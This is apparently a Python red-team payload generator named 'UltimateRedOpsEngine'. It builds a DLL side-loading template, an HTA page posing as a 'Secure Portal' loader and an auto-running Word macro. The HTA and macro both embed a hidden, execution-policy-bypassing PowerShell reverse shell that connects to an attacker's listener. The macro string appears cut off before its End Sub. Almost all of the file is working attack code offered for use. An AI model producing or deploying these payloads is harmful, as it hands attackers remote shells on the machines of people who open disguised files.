import base64
import random
class UltimateRedOpsEngine:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    def generate_dll_side_loading(self):
        return f"""// Ghost-SY1 DLL Side-Loading Exploit Template
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, "Ghost-SY1 Security", "Injected Successfully", MB_OK);
        // Connect back to {self.lhost}:{self.lport}
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}"""
    def generate_hta_attack(self):
        hta_script = f"""<html>
<head>
<script>
var c = new ActiveXObject("WScript.Shell");
c.Run("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\"$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\\"");
window.close();
</script>
</head>
<body>
<p>Loading Secure Portal...</p>
</body>
</html>"""
        return hta_script
    def generate_macro_payload(self):
        macro = f"""Sub AutoOpen()
    Dim str As String
    str = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$c = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$s.Write(([text.encoding]::ASCII).GetBytes($sb2),0,$sb2.Length)}};"""
        return macro
